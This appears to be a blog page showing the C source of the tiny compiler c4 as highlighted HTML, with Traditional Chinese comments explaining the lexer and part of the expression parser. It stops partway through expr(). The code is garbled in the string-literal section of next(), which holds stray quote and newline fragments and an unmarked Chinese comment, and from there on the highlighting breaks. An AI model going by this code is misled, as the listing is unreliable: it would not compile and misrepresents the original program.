<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *p, *lp, <span class="comment">// 原始碼中目前正在處理的位置</span></span><br><span class="line">     *data;   <span class="comment">// 程式碼段</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *e, *le,  <span class="comment">// 程式碼段</span></span><br><span class="line">    *id,      <span class="comment">// 目前正在詞法分析的標識符</span></span><br><span class="line">    *sym,     <span class="comment">// 符號表</span></span><br><span class="line">    tk,       <span class="comment">// 目前的符號</span></span><br><span class="line">    ival,    <span class="comment">// 符號對應的值</span></span><br><span class="line">    ty,       <span class="comment">// 目前表達式的類型</span></span><br><span class="line">    loc,     <span class="comment">// 局部變數在堆疊中的偏移</span></span><br><span class="line">    line,    <span class="comment">// 目前行數</span></span><br><span class="line">    src,     <span class="comment">// 輸出源碼和彙編</span></span><br><span class="line">    debug;   <span class="comment">// 列印執行的指令</span></span><br><span class="line"><span class="comment">// tokens and classes (operators last and in precedence order)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">為何 enum 是從 128 開始的呢？ </span></span><br><span class="line"><span class="comment">主要是因為 ASCII Code 定義的範圍是 0~127 共 128 字元，所以自訂的 token number 必須從 128 開始編號</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// Id = identifier 使用者定義的identifier</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*運算符</span></span><br><span class="line"><span class="comment">Assign =</span></span><br><span class="line"><span class="comment">Cond ?</span></span><br><span class="line"><span class="comment">Lor ||</span></span><br><span class="line"><span class="comment">Lan &amp;&amp;</span></span><br><span class="line"><span class="comment">Or |</span></span><br><span class="line"><span class="comment">Xor ^</span></span><br><span class="line"><span class="comment">And &amp;</span></span><br><span class="line"><span class="comment">Eq ==</span></span><br><span class="line"><span class="comment">Ne !=</span></span><br><span class="line"><span class="comment">Lt &lt;</span></span><br><span class="line"><span class="comment">Gt &gt;</span></span><br><span class="line"><span class="comment">Le &lt;=</span></span><br><span class="line"><span class="comment">Ge &gt;=</span></span><br><span class="line"><span class="comment">Shl &lt;&lt;</span></span><br><span class="line"><span class="comment">Shr &gt;&gt;</span></span><br><span class="line"><span class="comment">Add +</span></span><br><span class="line"><span class="comment">Sub -</span></span><br><span class="line"><span class="comment">Mul *</span></span><br><span class="line"><span class="comment">Div /</span></span><br><span class="line"><span class="comment">Mod %</span></span><br><span class="line"><span class="comment">Inc ++</span></span><br><span class="line"><span class="comment">Dec --</span></span><br><span class="line"><span class="comment">Brak [</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">id[Class] =</span></span><br><span class="line"><span class="comment">Num 常數數值</span></span><br><span class="line"><span class="comment">Fun 函數</span></span><br><span class="line"><span class="comment">Sys 系統調用</span></span><br><span class="line"><span class="comment">Glo 全域變數</span></span><br><span class="line"><span class="comment">Loc 局部變數</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//支援的標記類別(給詞法分析器next解析成對應的標記)</span></span><br><span class="line"><span class="comment">// C4所支援的輸入原始碼的字元集限定在7-bit ASCII上，所以每個輸入的字元只可能在[0, 127]的閉區間範圍內，所以是128</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  Num = <span class="number">128</span>, Fun, Sys, Glo, Loc, Id,</span><br><span class="line">  Char, Else, Enum, If, Int, Return, Sizeof, While,</span><br><span class="line">  Assign, Cond, Lor, Lan, Or, Xor, And, Eq, Ne, Lt, Gt, Le, Ge, Shl, Shr, Add, Sub, Mul, Div, Mod, Inc, Dec, Brak</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// opcodes</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">通常，LDR 用於將某些內容從記憶體載入到暫存器中，而 STR 用於將某些內容從暫存器儲存到記憶體位址。</span></span><br><span class="line"><span class="comment">sp：stack frame。</span></span><br><span class="line"><span class="comment">a：register 暫存器。</span></span><br><span class="line"><span class="comment">bp：概念跟 rbp(32 bits)/ebp(64 bits) 相同。</span></span><br><span class="line"><span class="comment">pc：program counter，指向當前指令。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 虛擬機器指令</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,</span><br><span class="line">       OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,</span><br><span class="line">       OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 支援的資料型別</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> CHAR, INT, PTR &#125;;</span><br><span class="line"><span class="comment">//因為作者沒有實作結構體,所以[id]指向的空間被分割為Idsz大小的區塊(模擬結構體)</span></span><br><span class="line"><span class="comment">//當id指向區塊首時,id[0] == id[Tk] 存取的就是Tk成員的資料(一般是指標)</span></span><br><span class="line"><span class="comment">//其實這種做法，在高階語言裡可以理解為：沒有物件的多元素數組，來模擬對象</span></span><br><span class="line"><span class="comment">//以下是符號表的各項：</span></span><br><span class="line"><span class="comment">//Name 指向的是這個identifier的Name</span></span><br><span class="line"><span class="comment">//Type 為資料型別(例如傳回值型別),如CHAR,INT,INT+PTR</span></span><br><span class="line"><span class="comment">//Class 為型別,如Num(常數數值),Fun(函數),Sys(系統呼叫),Glo全域變數,Loc 局部變數</span></span><br><span class="line"><span class="comment">//符號表是一個長數組，每個數組的元素為符號描述，元素長度為Idsz</span></span><br><span class="line"><span class="comment">// identifier offsets (since we can&#x27;t create an ident struct)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">由於 c4 不支援 struct，因此使用 enum 來定義 symbol table(called id for c4)。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> Tk, Hash, Name, Class, Type, Val, HClass, HType, HVal, Idsz &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//詞法分析開始：</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">next</span><span class="params">()</span></span><br><span class="line">&#123;<span class="comment">// 標識符=輸入的符號</span></span><br><span class="line">  <span class="type">char</span> *pp;<span class="comment">// 標識符的起始位置</span></span><br><span class="line"><span class="comment">//next() function 是根據 p 所指的 String 做 parsing token 的動作。</span></span><br><span class="line"><span class="comment">// 用循環來忽略空白字元,不過不能被詞法分析器辨識的字元都被認為是空白字元 例如 &#x27;@&#x27;, &#x27;$&#x27;</span></span><br><span class="line">  <span class="keyword">while</span> (tk = *p) &#123;<span class="comment">//最外層的 while 大部分情況都不會是終止條件，主要是由 while 內部直接 return，因此 next() 的邏輯是處理完一個 token 後就會直接 return。</span></span><br><span class="line">    ++p;</span><br><span class="line"><span class="comment">// 1、列印輸出訊息</span></span><br><span class="line">    <span class="keyword">if</span> (tk == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (src) &#123;<span class="comment">//命令列指明-s參數,輸出原始碼與對應字節碼</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: %.*s&quot;</span>, line, p - lp, lp);</span><br><span class="line">        lp = p;</span><br><span class="line">        <span class="keyword">while</span> (le &lt; e) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%8.4s&quot;</span>, &amp;<span class="string">&quot;LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,&quot;</span></span><br><span class="line">                           <span class="string">&quot;OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,&quot;</span></span><br><span class="line">                           <span class="string">&quot;OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT,&quot;</span>[*++le * <span class="number">5</span>]);</span><br><span class="line">          <span class="keyword">if</span> (*le &lt;= ADJ) <span class="built_in">printf</span>(<span class="string">&quot; %d\n&quot;</span>, *++le); <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);<span class="comment">//ADJ之前的指令都有運算元</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ++line;<span class="comment">// 行數+1</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 2、遇到巨集處理操作</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk == <span class="string">&#x27;#&#x27;</span>) &#123;<span class="comment">//#由於不支援巨集處理,所以直接跳過</span></span><br><span class="line">      <span class="keyword">while</span> (*p != <span class="number">0</span> &amp;&amp; *p != <span class="string">&#x27;\n&#x27;</span>) ++p;<span class="comment">// 忽略目前行的操作</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">這段是主要處理 Keywords。</span></span><br><span class="line"><span class="comment">第一步先算出該 token 的 hash value，然後利用 hash value and name 找尋 symbol table，</span></span><br><span class="line"><span class="comment">如果有找到就回傳該 token enum value；如果找不到就新增 id(symbol)，</span></span><br><span class="line"><span class="comment">並且設定 token enum value 為 Id(133)。</span></span><br><span class="line"><span class="comment">這邊最容易混淆的是 tk 這個 variable：在進入此 code block 之前，tk=*p；</span></span><br><span class="line"><span class="comment">然後在算 hash value 的時候，tk 代表的是 hash value；</span></span><br><span class="line"><span class="comment">最後要 return 前，tk 紀錄的是 token enum value。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 3.解析合法的變數名</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((tk &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;z&#x27;</span>) || (tk &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;Z&#x27;</span>) || tk == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">      pp = p - <span class="number">1</span>;<span class="comment">//因為有++p,pp回退一個字元,pp指向 [這個符號] 的首字母</span></span><br><span class="line">      <span class="keyword">while</span> ((*p &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;z&#x27;</span>) || (*p &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;Z&#x27;</span>) || (*p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;9&#x27;</span>) || *p == <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">        tk = tk * <span class="number">147</span> + *p++;<span class="comment">//計算標識符雜湊值,tk起始時已經等於*p,從p開始解析</span></span><br><span class="line">      tk = (tk &lt;&lt; <span class="number">6</span>) + (p - pp);<span class="comment">//雜湊值加上[符號長度]</span></span><br><span class="line">      id = sym;<span class="comment">//將id指向符號表</span></span><br><span class="line">      <span class="keyword">while</span> (id[Tk]) &#123;</span><br><span class="line"><span class="comment">//根據hash值還有字元來判斷該標識符是否已經儲存了</span></span><br><span class="line">        <span class="keyword">if</span> (tk == id[Hash] &amp;&amp; !<span class="built_in">memcmp</span>((<span class="type">char</span> *)id[Name], pp, p - pp)) </span><br><span class="line">				&#123; </span><br><span class="line"><span class="comment">//找到同名,則tk = id[Tk] (將id看做結構體,訪問其Tk成員,解釋見上)</span></span><br><span class="line">					tk = id[Tk];</span><br><span class="line">					<span class="keyword">return</span>; <span class="comment">//代表該識別碼已經被識別</span></span><br><span class="line">				&#125;</span><br><span class="line">        id = id + Idsz;<span class="comment">//繼續循環identifier表</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//找不到，將新的識別碼儲存到符號表中</span></span><br><span class="line">      id[Name] = (<span class="type">int</span>)pp;</span><br><span class="line">      id[Hash] = tk;<span class="comment">//哈希值</span></span><br><span class="line">      tk = id[Tk] = Id;<span class="comment">//哈希值</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//這三個條件分別處理的是十進位、十六進位、八進位。回傳計算後的 ival and tk=Num。</span></span><br><span class="line"><span class="comment">// 4、解析八進制、十進制、十六進制數字</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;<span class="comment">// 第一位為數字,認為是數值</span></span><br><span class="line">      <span class="keyword">if</span> (ival = tk - <span class="string">&#x27;0&#x27;</span>) &#123; <span class="keyword">while</span> (*p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;9&#x27;</span>) ival = ival * <span class="number">10</span> + *p++ - <span class="string">&#x27;0&#x27;</span>; &#125;<span class="comment">//第一位不為0,認為是十進制數</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (*p == <span class="string">&#x27;x&#x27;</span> || *p == <span class="string">&#x27;X&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> ((tk = *++p) &amp;&amp; ((tk &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;9&#x27;</span>) || (tk &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;f&#x27;</span>) || (tk &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;F&#x27;</span>)))<span class="comment">//第一位為0,且以x開頭,認為是16進制數</span></span><br><span class="line">          <span class="comment">//這邊處理 16 進位的方式相當有趣，主要是如何把 A~F 轉成 10~15，為何只需要 +9 就可以將 16 進位英文的部份轉成數字？關鍵在於 ‘A’ 的 ASCII code = 65 = ‘0100 0001’，而數字 10 的 2 進位是 ‘1010’，由於 16 進位並不會使用的 MSB 的 4 bits，因此 (tk &amp; 15) 濾掉前面 4 bits。觀察從 A 轉成數字 10 LSB 的差距：‘1010’ - ‘0001’ = ‘1001’ = 9。</span></span><br><span class="line">					ival = ival * <span class="number">16</span> + (tk &amp; <span class="number">15</span>) + (tk &gt;= <span class="string">&#x27;A&#x27;</span> ? <span class="number">9</span> : <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="keyword">while</span> (*p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;7&#x27;</span>) ival = ival * <span class="number">8</span> + *p++ - <span class="string">&#x27;0&#x27;</span>; &#125;<span class="comment">//認為是八進位數</span></span><br><span class="line">      tk = Num;<span class="comment">//token 為數值型,傳回</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 5、解析註釋，只支援單行註釋</span></span><br><span class="line"><span class="comment">//這段是處理 Div(/) or comment(//)，回傳tk=Div。</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (*p == <span class="string">&#x27;/&#x27;</span>) &#123;<span class="comment">//兩個&#x27;/&#x27;開頭,單行註釋</span></span><br><span class="line">        ++p;</span><br><span class="line">        <span class="keyword">while</span> (*p != <span class="number">0</span> &amp;&amp; *p != <span class="string">&#x27;\n&#x27;</span>) ++p;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        tk = Div;<span class="comment">//除法</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//這段主要是處理 String，並且將字串存入 data section 中。回傳 data 起始位置 ival = (int)pp;，如果 tk=` 將 token 設為 Num，tk=Num。</span></span><br><span class="line"><span class="comment">//值得一提的是，‘\n’ 需要特別處理，因為在字串處理中，‘\n’ 會被當成兩個字元，但其實在 ASCII 中他是 LF(換行字元)，ASCII code = 10。</span></span><br><span class="line"><span class="comment">// 6、解析字串</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk == <span class="string">&#x27;\&#x27;&#x27;</span> || tk == <span class="string">&#x27;&quot;&#x27;</span>) &#123;<span class="comment">//引號開頭,認為是字元(字串)</span></span><br><span class="line">      pp = data;</span><br><span class="line">      <span class="keyword">while</span> (*p != <span class="number">0</span> &amp;&amp; *p != tk) &#123;<span class="comment">//直到找到符合的引號為止</span></span><br><span class="line">        <span class="keyword">if</span> ((ival = *p++) == <span class="string">&#x27;\\&#x27;</span>) &#123;<span class="comment">// 解析轉義字符</span></span><br><span class="line">          <span class="keyword">if</span> ((ival = *p++) == <span class="string">&#x27;n&#x27;</span>) ival = <span class="string">&#x27;\n&#x27;</span>;\n<span class="string">&#x27;;// &#x27;</span>\n<span class="string">&#x27; 認為是&#x27;</span>\n<span class="string">&#x27; 其他直接忽略&#x27;</span>\<span class="string">&#x27;轉義</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if (tk == &#x27;</span><span class="string">&quot;&#x27;) *data++ = ival;//如果是雙引號,認為是字串,向data拷貝字符</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      ++p;</span></span><br><span class="line"><span class="string">      if (tk == &#x27;&quot;</span><span class="string">&#x27;) ival = (int)pp; else tk = Num;雙引號則ival指向data中字串開始,單引號則認為是數字</span></span><br><span class="line"><span class="string">      return;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">//Operator 的部分會轉成 token enum value，其他符號的部分就直接依照 ASCII Code 回傳，這就是為何 token enum value 要從 128 開始，因為不能和 ASCII Code 產生衝突！</span></span><br><span class="line"><span class="string">// 7、解析運算符號，和指令一一對應</span></span><br><span class="line"><span class="string">//經過 next() 後就完成 token parser，並且取得 token enum value(tk)(andival if need)。</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>=<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Eq; &#125; else tk = Assign; return; &#125;//等於,賦值</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>+<span class="string">&#x27;) &#123; if (*p == &#x27;</span>+<span class="string">&#x27;) &#123; ++p; tk = Inc; &#125; else tk = Add; return; &#125;//加,賦值</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>-<span class="string">&#x27;) &#123; if (*p == &#x27;</span>-<span class="string">&#x27;) &#123; ++p; tk = Dec; &#125; else tk = Sub; return; &#125;//減,自增</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>!<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Ne; &#125; return; &#125;//不等於</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>&lt;<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Le; &#125; else if (*p == &#x27;</span>&lt;<span class="string">&#x27;) &#123; ++p; tk = Shl; &#125; else tk = Lt; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>&gt;<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Ge; &#125; else if (*p == &#x27;</span>&gt;<span class="string">&#x27;) &#123; ++p; tk = Shr; &#125; else tk = Gt; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>|<span class="string">&#x27;) &#123; if (*p == &#x27;</span>|<span class="string">&#x27;) &#123; ++p; tk = Lor; &#125; else tk = Or; return; &#125;//邏輯或 || OR</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>&amp;<span class="string">&#x27;) &#123; if (*p == &#x27;</span>&amp;<span class="string">&#x27;) &#123; ++p; tk = Lan; &#125; else tk = And; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>^<span class="string">&#x27;) &#123; tk = Xor; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>%<span class="string">&#x27;) &#123; tk = Mod; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>*<span class="string">&#x27;) &#123; tk = Mul; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>[<span class="string">&#x27;) &#123; tk = Brak; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>?<span class="string">&#x27;) &#123; tk = Cond; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>~<span class="string">&#x27; || tk == &#x27;</span>;<span class="string">&#x27; || tk == &#x27;</span>&#123;<span class="string">&#x27; || tk == &#x27;</span>&#125;<span class="string">&#x27; || tk == &#x27;</span>(<span class="string">&#x27; || tk == &#x27;</span>)<span class="string">&#x27; || tk == &#x27;</span>]<span class="string">&#x27; || tk == &#x27;</span>,<span class="string">&#x27; || tk == &#x27;</span>:<span class="string">&#x27;) </span></span><br><span class="line"><span class="string">return;;//不做處理</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//表達式分析</span></span><br><span class="line"><span class="string">//lev表示運算子,因為各個&#x27;</span>運算子token是依照優先權<span class="string">&#x27;生序排列的,所以lev大表示優先權高</span></span><br><span class="line"><span class="string">//不做處理</span></span><br><span class="line"><span class="string">void expr(int lev)</span></span><br><span class="line"><span class="string">&#123;  int t, *d;</span></span><br><span class="line"><span class="string">//第一部分利用 recursive descent (parsing)，檢查 symbol table (semantic Analyzer)，直接產生 IR (Code Generator)；如果有需要就會進行第二部分，Operator precedence (parsing)，主要處理四則運算。</span></span><br><span class="line"><span class="string">  if (!tk) &#123; printf(&quot;%d: unexpected eof in expression\n&quot;, line); exit(-1); &#125;// 1、遇到非法輸入直接退出，報錯</span></span><br><span class="line"><span class="string">//Num 數字處理</span></span><br><span class="line"><span class="string">// 2、解析數字表達式</span></span><br><span class="line"><span class="string">  else if (tk == Num) &#123; *++e = IMM; *++e = ival; next(); ty = INT; &#125;//直接取立即數作為表達式值，用IMM 指令將它載入到AX 中</span></span><br><span class="line"><span class="string">//將字串存入 data section 中。回傳 data 起始位置 ival = (int)pp;</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;</span><span class="string">&quot;&#x27;) &#123;</span></span><br><span class="line"><span class="string">    *++e = IMM; *++e = ival; next();</span></span><br><span class="line"><span class="string">    while (tk == &#x27;&quot;</span><span class="string">&#x27;) next();//連續的&#x27;</span><span class="string">&quot;&#x27; 處理C風格多行文字 例如[&quot;</span>abc<span class="string">&quot; &quot;</span>def<span class="string">&quot;]</span></span><br><span class="line"><span class="string">    data = (char *)((int)data + sizeof(int) &amp; -sizeof(int)); ty = PTR;//這邊的 data 有特別做 alignment [https://en.wikipedia.org/wiki/Data_structure_alignment]，最後輸出 IR。</span></span><br><span class="line"><span class="string">//位元組對齊到int，在末尾追加結束符 ty = PTR;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 4、解析回傳類型表達式</span></span><br><span class="line"><span class="string">  else if (tk == Sizeof) &#123;//Sizeof Operator直接計算 sizeof 的大小。</span></span><br><span class="line"><span class="string">    next(); if (tk == &#x27;(&#x27;) next(); else &#123; printf(&quot;</span>%d: open paren expected in <span class="keyword">sizeof</span>\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    ty = INT; if (tk == Int) next(); else if (tk == Char) &#123; next(); ty = CHAR; &#125;</span></span><br><span class="line"><span class="string">    while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;//多層指標,每多一級加PTR</span></span><br><span class="line"><span class="string">    if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: close paren expected in <span class="keyword">sizeof</span>\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = IMM; *++e = (ty == CHAR) ? sizeof(char) : sizeof(int);//除了char是一位元組,int和多層指標</span></span><br><span class="line"><span class="string">    ty = INT;// 結果都為int型</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 5、解析變數取值與函數呼叫</span></span><br><span class="line"><span class="string">  else if (tk == Id) &#123;//變數處理</span></span><br><span class="line"><span class="string">    d = id; next();//第一個 if 處理 function call，第二個 else if 處理 enum，第三個 else 處理變數。</span></span><br><span class="line"><span class="string">    if (tk == &#x27;(&#x27;) &#123;//lookahead 的技巧。//函數</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      t = 0;//形參數</span></span><br><span class="line"><span class="string">      while (tk != &#x27;)&#x27;) &#123; expr(Assign); *++e = PSH; ++t; if (tk == &#x27;,&#x27;) next(); &#125;//計算實參的值，壓棧(傳參</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      if (d[Class] == Sys) *++e = d[Val];</span></span><br><span class="line"><span class="string">      else if (d[Class] == Fun) &#123; *++e = JSR; *++e = d[Val]; &#125;//系統呼叫,如malloc,memset,d[val]為opcode</span></span><br><span class="line"><span class="string">//使用者定義函數,d[Val]為函數入口位址</span></span><br><span class="line"><span class="string">      else &#123; printf(&quot;</span>%d: bad function call\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      if (t) &#123; *++e = ADJ; *++e = t; &#125;//因為用棧傳參,調整棧</span></span><br><span class="line"><span class="string">      ty = d[Type];//函數傳回值類型</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else if (d[Class] == Num) &#123; *++e = IMM; *++e = d[Val]; ty = INT; &#125;//d[Class] == Num,處理枚舉(只有枚舉是Class==Num)</span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">第一個 while 處理參數(argument)的部分，並且產生 push into stack 的 IR；</span></span><br><span class="line"><span class="string">接下來的兩個 if 分別處理system call and function call：</span></span><br><span class="line"><span class="string">system call 不做 binding 的動作，只保留 Symbol name；</span></span><br><span class="line"><span class="string">function call 則使用 JSR 指令來跳躍到該函式的真實位址。</span></span><br><span class="line"><span class="string">最後根據參數的數量調整 stack frame pointer。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*//變數</span></span><br><span class="line"><span class="string">//變數先取地址然後再LC/LI</span></span><br><span class="line"><span class="string">    else &#123;</span></span><br><span class="line"><span class="string">      if (d[Class] == Loc) &#123; *++e = LEA; *++e = loc - d[Val]; &#125;//取位址,d[Val]是局部變數偏移量</span></span><br><span class="line"><span class="string">      else if (d[Class] == Glo) &#123; *++e = IMM; *++e = d[Val]; &#125;//取位址,d[Val] 是全域變數指標</span></span><br><span class="line"><span class="string">      else &#123; printf(&quot;</span>%d: undefined variable\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *++e = ((ty = d[Type]) == CHAR) ? LC : LI;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 6、解析強制轉換，取得轉換的型別，直接修改type的值</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;(&#x27;) &#123;//括號處理 </span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    if (tk == Int || tk == Char) &#123;//強制型別轉換</span></span><br><span class="line"><span class="string">      t = (tk == Int) ? INT : CHAR; next();</span></span><br><span class="line"><span class="string">      while (tk == Mul) &#123; next(); t = t + PTR; &#125;//指針</span></span><br><span class="line"><span class="string">//第一個 if 處理 type casting，else 則是處理括號的優先權。</span></span><br><span class="line"><span class="string">      if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: bad cast\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      expr(Inc);//高優先權</span></span><br><span class="line"><span class="string">      ty = t;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else &#123;//一般語法括號</span></span><br><span class="line"><span class="string">      expr(Assign);</span></span><br><span class="line"><span class="string">      if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: close paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 7.解析指標取值</span></span><br><span class="line"><span class="string">  else if (tk == Mul) &#123;//取指標指向值</span></span><br><span class="line"><span class="string">//recursive-descent call expr()，然後 check type 是否為一階 pointer type 